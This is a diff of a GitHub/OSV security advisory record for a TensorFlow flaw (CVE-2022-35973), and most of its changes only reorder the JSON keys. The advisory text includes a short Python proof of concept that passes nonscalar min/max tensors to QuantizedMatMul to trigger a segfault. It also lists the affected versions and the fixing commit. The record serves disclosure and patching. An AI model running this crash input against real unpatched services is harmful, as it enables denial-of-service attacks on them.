@@ -1,57 +1,16 @@
 {
-  "id": "GHSA-689c-r7h2-fv9v",
-  "summary": "TensorFlow vulnerable to segfault in `QuantizedMatMul`",
-  "details": "### Impact\nIf `QuantizedMatMul` is given nonscalar input for:\n - `min_a`\n - `max_a`\n - `min_b`\n - `max_b`\nIt gives a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nToutput = tf.qint32\ntranspose_a = False\ntranspose_b = False\nTactivation = tf.quint8\na = tf.constant(7, shape=[3,4], dtype=tf.quint8)\nb = tf.constant(1, shape=[2,3], dtype=tf.quint8)\nmin_a = tf.constant([], shape=[0], dtype=tf.float32)\nmax_a = tf.constant(0, shape=[1], dtype=tf.float32)\nmin_b = tf.constant(0, shape=[1], dtype=tf.float32)\nmax_b = tf.constant(0, shape=[1], dtype=tf.float32)\ntf.raw_ops.QuantizedMatMul(a=a, b=b, min_a=min_a, max_a=max_a, min_b=min_b, max_b=max_b, Toutput=Toutput, transpose_a=transpose_a, transpose_b=transpose_b, Tactivation=Tactivation)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [aca766ac7693bf29ed0df55ad6bfcc78f35e7f48](https://github.com/tensorflow/tensorflow/commit/aca766ac7693bf29ed0df55ad6bfcc78f35e7f48).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n",
-  "aliases": [
-    "BIT-tensorflow-2022-35973",
-    "CVE-2022-35973"
-  ],
-  "modified": "2023-12-06T01:02:26.803059Z",
-  "published": "2022-09-16T22:22:27Z",
-  "related": [
-    "CVE-2022-35973"
-  ],
-  "database_specific": {
-    "nvd_published_at": "2022-09-16T21:15:00Z",
-    "github_reviewed_at": "2022-09-16T22:22:27Z",
-    "severity": "MODERATE",
-    "github_reviewed": true,
-    "cwe_ids": [
-      "CWE-20"
-    ]
-  },
-  "references": [
-    {
-      "type": "WEB",
-      "url": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-689c-r7h2-fv9v"
-    },
-    {
-      "type": "ADVISORY",
-      "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-35973"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/tensorflow/tensorflow/commit/aca766ac7693bf29ed0df55ad6bfcc78f35e7f48"
-    },
-    {
-      "type": "PACKAGE",
-      "url": "https://github.com/tensorflow/tensorflow"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0"
-    }
-  ],
   "affected": [
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-689c-r7h2-fv9v/GHSA-689c-r7h2-fv9v.json"
+      },
       "package": {
-        "name": "tensorflow",
         "ecosystem": "PyPI",
+        "name": "tensorflow",
         "purl": "pkg:pypi/tensorflow"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "0"
@@ -59,7 +18,8 @@
             {
               "fixed": "2.7.2"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
@@ -135,20 +95,19 @@
         "2.7.0rc0",
         "2.7.0rc1",
         "2.7.1"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-689c-r7h2-fv9v/GHSA-689c-r7h2-fv9v.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-689c-r7h2-fv9v/GHSA-689c-r7h2-fv9v.json"
+      },
       "package": {
-        "name": "tensorflow",
         "ecosystem": "PyPI",
+        "name": "tensorflow",
         "purl": "pkg:pypi/tensorflow"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "2.8.0"
@@ -156,25 +115,25 @@
             {
               "fixed": "2.8.1"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
         "2.8.0"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-689c-r7h2-fv9v/GHSA-689c-r7h2-fv9v.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-689c-r7h2-fv9v/GHSA-689c-r7h2-fv9v.json"
+      },
       "package": {
-        "name": "tensorflow",
         "ecosystem": "PyPI",
+        "name": "tensorflow",
         "purl": "pkg:pypi/tensorflow"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "2.9.0"
@@ -182,25 +141,25 @@
             {
               "fixed": "2.9.1"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
         "2.9.0"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-689c-r7h2-fv9v/GHSA-689c-r7h2-fv9v.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-689c-r7h2-fv9v/GHSA-689c-r7h2-fv9v.json"
+      },
       "package": {
-        "name": "tensorflow-cpu",
         "ecosystem": "PyPI",
+        "name": "tensorflow-cpu",
         "purl": "pkg:pypi/tensorflow-cpu"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "0"
@@ -208,7 +167,8 @@
             {
               "fixed": "2.7.2"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
@@ -244,20 +204,19 @@
         "2.6.5",
         "2.7.0",
         "2.7.1"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-689c-r7h2-fv9v/GHSA-689c-r7h2-fv9v.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-689c-r7h2-fv9v/GHSA-689c-r7h2-fv9v.json"
+      },
       "package": {
-        "name": "tensorflow-cpu",
         "ecosystem": "PyPI",
+        "name": "tensorflow-cpu",
         "purl": "pkg:pypi/tensorflow-cpu"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "2.8.0"
@@ -265,25 +224,25 @@
             {
               "fixed": "2.8.1"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
         "2.8.0"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-689c-r7h2-fv9v/GHSA-689c-r7h2-fv9v.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-689c-r7h2-fv9v/GHSA-689c-r7h2-fv9v.json"
+      },
       "package": {
-        "name": "tensorflow-cpu",
         "ecosystem": "PyPI",
+        "name": "tensorflow-cpu",
         "purl": "pkg:pypi/tensorflow-cpu"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "2.9.0"
@@ -291,25 +250,25 @@
             {
               "fixed": "2.9.1"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
         "2.9.0"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-689c-r7h2-fv9v/GHSA-689c-r7h2-fv9v.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-689c-r7h2-fv9v/GHSA-689c-r7h2-fv9v.json"
+      },
       "package": {
-        "name": "tensorflow-gpu",
         "ecosystem": "PyPI",
+        "name": "tensorflow-gpu",
         "purl": "pkg:pypi/tensorflow-gpu"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "0"
@@ -317,7 +276,8 @@
             {
               "fixed": "2.7.2"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
@@ -390,20 +350,19 @@
         "2.7.0rc0",
         "2.7.0rc1",
         "2.7.1"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-689c-r7h2-fv9v/GHSA-689c-r7h2-fv9v.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-689c-r7h2-fv9v/GHSA-689c-r7h2-fv9v.json"
+      },
       "package": {
-        "name": "tensorflow-gpu",
         "ecosystem": "PyPI",
+        "name": "tensorflow-gpu",
         "purl": "pkg:pypi/tensorflow-gpu"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "2.8.0"
@@ -411,25 +370,25 @@
             {
               "fixed": "2.8.1"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
         "2.8.0"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-689c-r7h2-fv9v/GHSA-689c-r7h2-fv9v.json"
-      }
+      ]
     },
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-689c-r7h2-fv9v/GHSA-689c-r7h2-fv9v.json"
+      },
       "package": {
-        "name": "tensorflow-gpu",
         "ecosystem": "PyPI",
+        "name": "tensorflow-gpu",
         "purl": "pkg:pypi/tensorflow-gpu"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "2.9.0"
@@ -437,22 +396,63 @@
             {
               "fixed": "2.9.1"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
         "2.9.0"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-689c-r7h2-fv9v/GHSA-689c-r7h2-fv9v.json"
-      }
+      ]
     }
+  ],
+  "aliases": [
+    "BIT-tensorflow-2022-35973",
+    "CVE-2022-35973"
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-20"
+    ],
+    "github_reviewed": true,
+    "github_reviewed_at": "2022-09-16T22:22:27Z",
+    "nvd_published_at": "2022-09-16T21:15:00Z",
+    "severity": "MODERATE"
+  },
+  "details": "### Impact\nIf `QuantizedMatMul` is given nonscalar input for:\n - `min_a`\n - `max_a`\n - `min_b`\n - `max_b`\nIt gives a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nToutput = tf.qint32\ntranspose_a = False\ntranspose_b = False\nTactivation = tf.quint8\na = tf.constant(7, shape=[3,4], dtype=tf.quint8)\nb = tf.constant(1, shape=[2,3], dtype=tf.quint8)\nmin_a = tf.constant([], shape=[0], dtype=tf.float32)\nmax_a = tf.constant(0, shape=[1], dtype=tf.float32)\nmin_b = tf.constant(0, shape=[1], dtype=tf.float32)\nmax_b = tf.constant(0, shape=[1], dtype=tf.float32)\ntf.raw_ops.QuantizedMatMul(a=a, b=b, min_a=min_a, max_a=max_a, min_b=min_b, max_b=max_b, Toutput=Toutput, transpose_a=transpose_a, transpose_b=transpose_b, Tactivation=Tactivation)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [aca766ac7693bf29ed0df55ad6bfcc78f35e7f48](https://github.com/tensorflow/tensorflow/commit/aca766ac7693bf29ed0df55ad6bfcc78f35e7f48).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n",
+  "id": "GHSA-689c-r7h2-fv9v",
+  "modified": "2023-12-06T01:02:26.803059Z",
+  "published": "2022-09-16T22:22:27Z",
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-689c-r7h2-fv9v"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-35973"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/commit/aca766ac7693bf29ed0df55ad6bfcc78f35e7f48"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/tensorflow/tensorflow"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0"
+    }
+  ],
+  "related": [
+    "CVE-2022-35973"
   ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V3",
-      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "type": "CVSS_V3"
     }
-  ]
+  ],
+  "summary": "TensorFlow vulnerable to segfault in `QuantizedMatMul`"
 }
